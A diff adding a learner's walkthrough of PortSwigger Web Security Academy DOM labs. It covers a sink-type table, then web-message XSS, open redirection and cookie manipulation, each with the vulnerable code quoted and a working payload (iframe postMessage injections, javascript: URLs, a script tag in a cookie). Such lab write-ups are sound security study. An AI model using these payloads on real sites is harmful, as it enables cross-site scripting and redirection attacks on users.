@@ -1,0 +1,101 @@
+Sink's type            What it does                                                   In code                   Working payload    
+HTML Sink              It interprets the text as HTML and draws it.                   element.innerHTML         <img src=x onerror=...>
+Execution Sink         It runs the text directly as JavaScript code.                  eval(data)                alert(1)
+URL/Navigation Sink    Opens or navigates to a new web address.                       location.href             javascript:alert(1)
+Attribute Sink         Overwrites an existing element's property (e.g. src, href).    element.src = data        javascript:alert(1)
+
+
+
+
+Task 1:
+///Lab: DOM XSS using web messages///
+
+Dom based weaknesses means the communication between two webpage i not correctly filtered, or not filtered at all. In the page's source there are these lines:
+
+                        window.addEventListener('message', function(e) {
+                            document.getElementById('ads').innerHTML = e.data;
+                        })
+As we can see there is no filter at all (like event.origin). So if this webpage get any data from another (probably malicious) webserver, it will runs it automatically.
+So our exploit server will send a message to the webapp, it will get into the innerHTML (without any filter) and runs automatically (HTML sink)
+<iframe src="https://0ad500a104d17e9e800508f8002b00d9.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=print()>', '*')"></iframe>
+
+Task 2:
+///Lab: DOM XSS using web messages and a JavaScript URL///
+
+Checking the script part:
+
+                        window.addEventListener('message', function(e) {
+                            var url = e.data;
+                            if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
+                                location.href = url;
+                            }
+                        }, false);
+
+So the window.addEventListeres is silently listens to any 'message' in the background, and if something comes in it saves into 'url' variable.
+Then there is a little filter, if in the webapp's message there is 'http:' or 'https:', then its allows the message forward, else it wont, but it doesnt matter where it is in the url!
+And the main part is, that our message will be loaded into the URL sink, which means we will use javascript:print():
+<iframe src="https://0a90004203fad28e829329f100340071.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
+
+Task 3:
+///Lab: DOM XSS using web messages and JSON.parse///
+
+Script part from the source code:
+
+                        window.addEventListener('message', function(e) {
+                            var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
+                            document.body.appendChild(iframe);
+                            try {
+                                d = JSON.parse(e.data);
+                            } catch(e) {
+                                return;
+                            }
+                            switch(d.type) {
+                                case "page-load":
+                                    ACMEplayer.element.scrollIntoView();
+                                    break;
+                                case "load-channel":
+                                    ACMEplayer.element.src = d.url;
+                                    break;
+                                case "player-height-changed":
+                                    ACMEplayer.element.style.width = d.width + "px";
+                                    ACMEplayer.element.style.height = d.height + "px";
+                                    break;
+                            }
+                        }, false);
+
+Lets see whats going on here...The code is waiting for not a simple message, but for a JSON object...(like: {"something": "anything", "url": "...", "etc": "btc"}). 
+So the variable 'd' will be our message which has to be in this format: {"x": "y", "z": "..."}. From the code we can see there is a d.type and 3 cases, the "load-channel" case is changing the iframe.src's value 
+to what we send in the d.url.
+Which means we payload will be {"type": "load-channel", "url": "javascript:print()"} >>>since it is going into the 'attribute sink' (iframe.src).
+Now. Paste this into the exploit servers body:
+<iframe src=https://0a8f00a90398303483a95177007400b7.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
+The \ characters are "escape characters". we need them because the javascript's motor reads the code from the left to the right, and after the second " the code would be just rubbish for the compiler, which
+is not good for us.
+
+Task 4:
+///Lab: DOM-based open redirection///
+
+"Open redirection", so we are searching for a "home" or "back to home page" link, which can be vulnerable...If you click on one of the posts, in the top of the right side there is a "home" link, and
+at the bottom right the is a "back to Blog" link, lets check them in source code:
+The home link:
+<a href="/">Home</a>
+The back to Blog link:
+<a href="#" onclick="returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : &quot;/&quot;">Back to Blog</a>
+And the "back to Blog" is the winner. Why?
+Because it checks two condition at the same time...is there a "url=xy" parameter in the url or not? in this url is it 'https://' or 'http://' or not? If no is the answer any of them it returns us to the main page.
+But if both conditions are right because of the ".+" part, we can write anyithing after https://. So we have to add the url=https//:xyz.com to the url and we won...This url will be our exploit servers url:
+https://0ad300700380369f81a448cc009000b7.web-security-academy.net/post?postId=1&url=https://exploit-0a9c00a1033b36bc810347d901810061.exploit-server.net/
+
+Task 5:
+///Lab: DOM-based cookie manipulation///
+
+"cookie manipulation" So we are looking after document.cookie in the source code...:
+
+                            document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
+
+So the whole url goes into the lastViewedProduct cookie, plus we have free control over the end of the url ( + window.location). Which means we can copy the <script>print()</script> into our malicious server's url
+Go to exploit server and copy into our payload:
+<iframe src='https://0a4f009603e8955383214b2500bf002f.web-security-academy.net/product?productId=5&"><script>print()</script>'></iframe>
+
+Sometimes changing between ' and " is the solution for a lab...!!!
+
